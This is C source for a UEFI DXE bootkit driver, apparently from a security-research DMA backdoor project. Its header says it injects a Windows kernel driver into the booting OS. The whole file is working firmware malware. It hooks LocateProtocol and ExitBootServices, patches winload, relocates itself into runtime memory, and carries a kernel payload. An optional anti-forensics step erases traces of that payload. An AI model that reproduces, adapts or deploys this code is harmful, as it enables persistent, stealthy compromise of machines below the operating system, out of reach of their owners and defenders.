/*
 *********************************************************************
  
  UEFI DXE driver that injects Windows kernel driver into the 
  loading operating system.
  
  @d_olex

 *********************************************************************
 */

#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SerialIo.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>

#include <IndustryStandard/PeImage.h>

#include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"

#include "../config.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "peimage.h"
#include "ovmf.h"
#include "std.h"
#include "DmaBackdoorBoot.h"
#include "Winload.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)
#pragma warning(disable: 4550)

#pragma section(".conf", read, write)

#define MAX_IMAGE_SIZE (1 * 1024 * 1024)

EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
); 

EFI_STATUS
EFIAPI
BackdoorEntryDma(
    EFI_GUID *Protocol, VOID *Registration, VOID **Interface
);

EFI_STATUS 
EFIAPI 
BackdoorEntryInfected(
    EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryDma,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0,

    // *******************************************************

    // address of infector entry point
    (UINT64)&BackdoorEntryInfected,

    // RVA of original entry point
    0
};

VOID *m_ImageBase = NULL;
EFI_SYSTEM_TABLE *m_ST = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;
EFI_RUNTIME_SERVICES *m_RT = NULL;

// debug messages stuff
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
EFI_PHYSICAL_ADDRESS *m_PendingOutputAddr = (EFI_PHYSICAL_ADDRESS *)(DEBUG_OUTPUT_ADDR);
char *m_PendingOutput = NULL;

// winload hook stuff
VOID *m_WinloadBase = NULL;
BACKDOOR_INFO m_BackdoorInfo;

// report backdoor status using INFECTOR_STATUS_ADDR and HYPER_V_INFO_ADDR memory regions
BOOLEAN m_bReportStatus = FALSE;

// kernel mode payload to inject into the running operating system
VOID *m_Payload = NULL;
UINT32 m_PayloadSize = 0;
//--------------------------------------------------------------------------------------
void ConsolePrintScreen(char *Message)
{    
    if (m_TextOutput)
    {        
        size_t Len = std_strlen(Message), i = 0;

        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }
}

void ConsolePrintBuffer(char *Message)
{
    size_t Len = std_strlen(Message);

    if (m_PendingOutput && std_strlen(m_PendingOutput) + Len < DEBUG_OUTPUT_SIZE)
    {                    
        strcat(m_PendingOutput, Message);
    }
}

void ConsolePrint(char *Message)
{
    // print messages to the screem
    ConsolePrintScreen(Message);

    // save messages to the buffer
    ConsolePrintBuffer(Message);
}
//--------------------------------------------------------------------------------------
void ConsoleInitialize(void)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_PHYSICAL_ADDRESS PagesAddr;

#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        m_ST->ConsoleOutHandle, &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

#endif

    // allocate memory for debug output
    Status = m_BS->AllocatePages(
        AllocateAnyPages, EfiRuntimeServicesData, 
        (DEBUG_OUTPUT_SIZE / PAGE_SIZE), &PagesAddr
    );
    if (Status == EFI_SUCCESS) 
    {
        EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;

        if (m_bReportStatus)
        {
            *m_PendingOutputAddr = PagesAddr;
        }

        m_PendingOutput = (char *)PagesAddr;        
        std_memset(m_PendingOutput, 0, DEBUG_OUTPUT_SIZE);

        // save memory address into the firmware variable
        Status = m_ST->RuntimeServices->SetVariable(
            BACKDOOR_VAR_NAME, &VariableGuid,
            EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(PagesAddr), (VOID *)&PagesAddr
        );
        if (EFI_ERROR(Status)) 
        {
            DbgMsg(__FILE__, __LINE__, "SetVariable() fails: 0x%X\r\n", Status);
        }
    }
    else
    {     
        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
    }
}
//--------------------------------------------------------------------------------------
VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if (m_TextOutput == NULL)
    {
        // initialize console I/O
        Status = m_BS->HandleProtocol(
            m_ST->ConsoleOutHandle,
            &gEfiSimpleTextOutProtocolGuid, 
            (VOID **)&m_TextOutput
        );
        if (Status == EFI_SUCCESS)
        {
            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
            m_TextOutput->ClearScreen(m_TextOutput);

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Text output protocol is ready\r\n");
            
            if (m_PendingOutput)
            {                
                // print pending messages
                ConsolePrintScreen(m_PendingOutput);

#if !defined(BACKDOOR_DEBUG_SCREEN)

                m_TextOutput = NULL;
#endif
                m_BS->Stall(TO_MICROSECONDS(3));
            }            
        }        
    }        
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {       
        EFI_IMAGE_DOS_HEADER *pDosHdr = (EFI_IMAGE_DOS_HEADER *)Base; 

        // check for DOS header
        if (pDosHdr->e_magic == EFI_IMAGE_DOS_SIGNATURE &&
            pDosHdr->e_lfanew < 0x100)
        {
            EFI_IMAGE_NT_HEADERS *pNtHdr = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, pDosHdr->e_lfanew);

            // check for NT header
            if (pNtHdr->Signature == EFI_IMAGE_NT_SIGNATURE)
            {
                return Base;
            }
        }

        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *BackdoorImageRealocate(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;      

    DbgMsg(
        __FILE__, __LINE__, __FUNCTION__"(): image size = 0x%x\r\n", 
        pHeaders->OptionalHeader.SizeOfImage
    );  

    // allocate memory for executable image
    Status = m_BS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, PagesCount, &Addr);
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        std_memcpy(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations acording to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
// original address of hooked function
EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;

// return address to ExitBootServices() caller
UINT64 ret_ExitBootServices = 0;

VOID *FindWinloadImage(UINT64 Addr)
{
    VOID *Image = NULL;
    UINT64 Size = 0;

    // align by page boundary
    Addr &= ~(PAGE_SIZE - 1);

    // determinate winload.dll base address
    for (Size = 0; Size < MAX_IMAGE_SIZE && Addr > 0; Size += 1)
    {
        if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
        {
            Image = (VOID *)Addr;
            break;
        }

        Addr -= PAGE_SIZE;
    }   

    if (Image)
    {
        EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
            Image, ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);

        // get image exports
        UINT32 ExportAddr = pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (ExportAddr != 0)
        {                    
            EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    

            // check winload image name
            if (std_strcmp((char *)RVATOVA(Image, Export->Name), "BootLib.dll") == 0 ||
                std_strcmp((char *)RVATOVA(Image, Export->Name), "winload.dll") == 0 ||
                std_strcmp((char *)RVATOVA(Image, Export->Name), "winload.sys") == 0)
            {
                return Image;
            }
        }
    }

    return NULL;
}

EFI_STATUS EFIAPI new_ExitBootServices(
    EFI_HANDLE ImageHandle,
    UINTN Key)
{    
    PBACKDOOR_INFO pBackdoorInfo = (PBACKDOOR_INFO)(BACKDOOR_INFO_ADDR);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() called\r\n");    

    if (m_WinloadBase == NULL)
    {        
        VOID *WinloadBase = NULL;

        // chcek if OpenProtocol() was called from the winload image
        if ((WinloadBase = FindWinloadImage(ret_ExitBootServices)) != NULL)
        {            
            // set up winload hooks
            WinloadHook(WinloadBase);

            m_WinloadBase = WinloadBase;
        }
    }

    switch (m_BackdoorInfo.Status)
    {
    case BACKDOOR_ERR_WINLOAD_IMAGE:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload.efi\r\n");
        break;

    case BACKDOOR_ERR_WINLOAD_SIGN_1:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpBelow1MbPage\r\n");
        break;

    case BACKDOOR_ERR_WINLOAD_SIGN_2:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!OslArchTransferToKernel()\r\n");
        break;

    case BACKDOOR_ERR_WINLOAD_HV:

        DbgMsg(__FILE__, __LINE__, "ERROR: Hyper-V is loaded, giving up\r\n");
        break;
    }

    // prevent to call DXE services during runtime phase
    m_TextOutput = NULL;

    if (m_bReportStatus)
    {
        // report Hyper-V information
        std_memcpy(pBackdoorInfo, &m_BackdoorInfo, sizeof(BACKDOOR_INFO));
    }

    // exit to the original function
    return old_ExitBootServices(ImageHandle, Key);
}
//--------------------------------------------------------------------------------------
typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

EFI_STATUS RegisterProtocolNotifyDxe(
    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
    EFI_EVENT *Event, VOID **Registration)
{
    EFI_STATUS Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
    if (EFI_ERROR(Status)) 
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
        return Status;
    }

    Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration);
    if (EFI_ERROR(Status)) 
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);

    return Status;
}

VOID BackdoorEntryResident(VOID *Image)
{               
    PBACKDOOR_INFO pBackdoorInfo = (PBACKDOOR_INFO)(BACKDOOR_INFO_ADDR);
    PINFECTOR_STATUS pInfectorStatus = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);    

#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)

    VOID *Registration = NULL;
    EFI_EVENT Event = NULL;  

    // set text output protocol register notify
    RegisterProtocolNotifyDxe(
        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
        &Event, &Registration
    );

#endif

    m_ImageBase = Image;        

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    if (WinloadInitialize())
    {
        // hook EFI_BOOT_SERVICES.ExitBootServices()
        old_ExitBootServices = m_BS->ExitBootServices;
        m_BS->ExitBootServices = _ExitBootServices;

        DbgMsg(
            __FILE__, __LINE__, "ExitBootServices() hook was set, handler = "FPTR"\r\n",
            _ExitBootServices
        );    

        m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_IMAGE;
    }
    else
    {
        m_BackdoorInfo.Status = BACKDOOR_ERR_UNKNOWN;    
    }
    
    m_BackdoorInfo.ImageBase = NULL;
    m_BackdoorInfo.ImageFunc = NULL;

    if (m_bReportStatus)
    {
        // notify about successful DXE driver execution
        pInfectorStatus->Status = BACKDOOR_SUCCESS;

        // backdoor is not ready yet
        pBackdoorInfo->Status = BACKDOOR_NOT_READY;
    }

#if !defined(BACKDOOR_DEBUG_SCREEN)

    m_TextOutput = NULL;

#endif

}
//--------------------------------------------------------------------------------------
#define SYSTEM_TABLE_START 0x70000000
#define SYSTEM_TABLE_END   0xd0000000

EFI_SYSTEM_TABLE *BackdoorFindSystemTable(void)
{
    UINTN Ptr = 0;

    for (Ptr = SYSTEM_TABLE_START; Ptr < SYSTEM_TABLE_END; Ptr += sizeof(UINT64))
    {
        EFI_SYSTEM_TABLE *SystemTable = (EFI_SYSTEM_TABLE *)Ptr;

        // check for the valid system table header
        if (SystemTable->Hdr.Signature == EFI_SYSTEM_TABLE_SIGNATURE &&
            SystemTable->Hdr.HeaderSize < PAGE_SIZE &&
            SystemTable->Hdr.Revision < (3 << 16) &&
            SystemTable->Hdr.Reserved == 0)
        {
            return SystemTable;
        }
    }

    return NULL;
}

EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    VOID *Base = NULL;
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  
    m_bReportStatus = TRUE;

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    if (LocateProtocol != NULL)
    {
        // remove LocateProtocol() hook
        SystemTable->BootServices->LocateProtocol = LocateProtocol;
    }

    if (SystemTable == NULL)
    {
        // scan memory and find system table address
        SystemTable = BackdoorFindSystemTable();
    }

    if (SystemTable != NULL)
    {
        // call real entry point
        _ModuleEntryPoint(NULL, SystemTable);    
    }

    if (LocateProtocol != NULL)
    {
        // call hooked function
        return LocateProtocol(Protocol, Registration, Interface);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    VOID *Base = NULL;
    EFI_LOADED_IMAGE *LoadedImage = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  
    
    // call real entry point
    _ModuleEntryPoint(NULL, SystemTable);

    // get current image information
    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);  

    if (LoadedImage && m_InfectorConfig.OriginalEntryPoint != 0)
    {
        EFI_IMAGE_ENTRY_POINT Entry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
            LoadedImage->ImageBase,
            m_InfectorConfig.OriginalEntryPoint
        );

        // call original entry point
        return Entry(ImageHandle, SystemTable);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable) 
{    
    m_ST = SystemTable;    
    m_BS = SystemTable->BootServices;    
    m_RT = SystemTable->RuntimeServices;

#if defined(BACKDOOR_DEBUG)
#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif

    // initialize text output
    ConsoleInitialize();

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  Boot backdoor loaded!       \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

#endif

    if (m_ImageBase == NULL)
    {   
        if (ImageHandle)
        {     
            EFI_LOADED_IMAGE *LoadedImage = NULL;

            // bootkit was loaded as EFI application
            EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);      
            if (Status == EFI_SUCCESS)
            {
                // get current image base
                m_ImageBase = LoadedImage->ImageBase;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "HandleProtocol() fails: 0x%X\r\n", Status);
            }
        }
        else
        {
            // get backdoor image base address
            m_ImageBase = ImageBaseByAddress(get_addr());
        }
    }

    if (m_ImageBase)
    {
        VOID *Image = NULL;
        PBACKDOOR_PAYLOAD pPayload = BACKDOOR_PAYLOAD_INFO(m_ImageBase);

        DbgMsg(__FILE__, __LINE__, "Image address is "FPTR"\r\n", m_ImageBase);

        // check if we have any payload to execute
        if (pPayload->Offset != 0 && pPayload->Size != 0)
        {
            EFI_STATUS Status = 0;     
            EFI_PHYSICAL_ADDRESS Addr = 0;
            UINTN PagesCount = (pPayload->Size / PAGE_SIZE) + 1;        

            DbgMsg(__FILE__, __LINE__, "Payload size is %d bytes\r\n", pPayload->Size);

            // allocate memory for payload image
            Status = m_BS->AllocatePages(
                AllocateAnyPages,
                EfiRuntimeServicesData,
                PagesCount,
                &Addr
            );
            if (Status == EFI_SUCCESS)
            {     
                VOID *Payload = RVATOVA(m_ImageBase, pPayload->Offset);

                m_Payload = (VOID *)Addr;
                m_PayloadSize = pPayload->Size;

                DbgMsg(__FILE__, __LINE__, "Payload base address is "FPTR"\r\n", m_Payload);

                // copy payload image to the new location
                std_memcpy(m_Payload, Payload, m_PayloadSize); 

#ifdef USE_ANTI_FORENSICS

                // erase old payload image
                std_memset(Payload, 0, m_PayloadSize);
#endif
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "AllocatePool() fails: %X\r\n", Status);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "Payload is not present\r\n");
        }

        // copy image to the new location
        if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
        {
            BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
                Image,
                (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
            );
            
            DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
            
            // initialize backdoor resident code
            pEntry(Image);
        } 
    }

#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)

    m_BS->Stall(TO_MICROSECONDS(3));

#endif

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
